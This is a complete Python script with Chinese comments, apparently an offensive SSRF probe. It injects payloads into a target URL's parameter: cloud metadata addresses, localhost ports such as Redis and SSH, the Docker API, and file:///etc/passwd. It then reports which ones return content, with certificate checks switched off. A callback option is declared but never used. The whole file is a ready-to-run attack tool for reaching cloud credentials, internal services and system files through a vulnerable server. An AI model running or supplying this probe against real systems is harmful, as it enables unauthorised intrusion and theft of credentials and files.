#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SSRF 探针: 判断可控 URL 是否可访问内网/云元数据
用法:
  python ssrf_probe.py -u "http://target.com/proxy?url=FUZZ" --callback-callback.your.com
  python ssrf_probe.py -u "http://target.com/api/FUZZ" --mode metadata
"""
import argparse, re, ssl, sys, urllib.request, urllib.error, urllib.parse

TARGETS = {
    "metadata": ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/"],
    "internal": ["http://localhost", "http://localhost:80", "http://127.0.0.1", "http://127.0.0.1:8080",
                 "http://127.0.0.1:22", "http://127.0.0.1:6379", "http://[::1]"],
    "docker": ["http://host.docker.internal:2375/containers/json", "http://docker.for.mac.localhost"],
    "files": ["file:///etc/passwd", "file:///c:/windows/win.ini"],
}

def probe(url, target, timeout=6):
    u = url.replace("FUZZ", urllib.parse.quote(target, safe=""))
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read().decode("utf-8", "ignore")
            return r.status, len(body), body[:200]
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "ignore")
        return e.code, len(body), body[:200]
    except Exception:
        return None, 0, ""

def main():
    ap = argparse.ArgumentParser(description="SSRF 探针(内网/云元数据/文件)")
    ap.add_argument("-u", "--url", required=True, help="目标 URL,用 FUZZ 标记注入点")
    ap.add_argument("-m", "--mode", default="all", choices=["all","metadata","internal","docker","files"])
    ap.add_argument("--callback", help="外带回调域名(可接收 DNS/HTTP 回显)")
    args = ap.parse_args()

    targets = []
    if args.mode == "all":
        for v in TARGETS.values():
            targets.extend(v)
    else:
        targets = TARGETS.get(args.mode, [])

    print(f"[*] 目标 URL: {args.url}")
    results = []
    for t in targets:
        code, size, frag = probe(args.url, t)
        if code and size > 10:
            results.append((t, code, size, frag[:100]))
            print(f"    [+] {t} -> {code} ({size}B)")

    if not results:
        print("\n[-] 未发现 SSRF 回显")
    else:
        print(f"\n[+] 发现 {len(results)} 个可访问目标")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(130)
